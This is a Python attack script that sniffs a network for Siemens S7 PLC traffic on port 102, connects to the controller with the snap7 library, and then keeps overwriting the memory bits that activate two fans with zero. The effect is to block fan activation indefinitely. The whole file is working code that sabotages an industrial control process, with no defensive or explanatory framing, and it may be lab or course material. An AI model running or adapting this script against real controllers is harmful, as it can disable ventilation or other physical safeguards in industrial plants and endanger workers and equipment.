from scapy.all import *
import snap7
import time
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    print("[*] Scanning network for Siemens S7 PLCs...")
    conf.checkIPaddr = False
    plc_ip = None

    def detect_plc(pkt):
        nonlocal plc_ip
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            if pkt[TCP].dport == 102:  # Port 102 is used for S7 communications
                if plc_ip is None:
                    plc_ip = pkt[IP].src
                    print(f"[+] Siemens PLC found at: {plc_ip}")

    sniff(filter="tcp port 102", prn=detect_plc, timeout=10)

    if plc_ip:
        return plc_ip
    else:
        print("[-] No Siemens PLC detected on the network.")
        exit(1)

# Function to block write commands to specific memory addresses of the PLC
def block_command_messages(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip}")
    
    # Create a socket connection to listen for write operations
    plc = snap7.client.Client()
    try:
        plc.connect(plc_ip, 0, 1)
        print("[+] Connected to Siemens S7-1200 PLC")
    except:
        print("[-] Failed to connect to PLC")
        return
    
    while True:
        try:
            # Read the memory status of Activate_Fan_A and Activate_Fan_B
            fan_a_status = plc.read_area(snap7.types.Areas.MK, 0, 0, 1)  # %M0.0
            fan_b_status = plc.read_area(snap7.types.Areas.MK, 0, 1, 1)  # %M0.1
            
            # If activation signals are sent, immediately override them to 0 (blocking activation)
            if fan_a_status[0] == 1 or fan_b_status[0] == 1:
                print("[!] Blocking fan activation signals...")
                
                # Overwrite with 0 to block commands
                plc.write_area(snap7.types.Areas.MK, 0, 0, bytes([0]))  # Block Activate_Fan_A (%M0.0)
                plc.write_area(snap7.types.Areas.MK, 0, 1, bytes([0]))  # Block Activate_Fan_B (%M0.1)
                
                print("[+] Activation commands blocked.")

            time.sleep(1)  # Check every second
        
        except KeyboardInterrupt:
            print("\n[+] Script terminated by user.")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

    plc.disconnect()

if __name__ == "__main__":
    plc_ip = find_plc_ip()  # Step 1: Find PLC IP
    block_command_messages(plc_ip)  # Step 2: Block specific write commands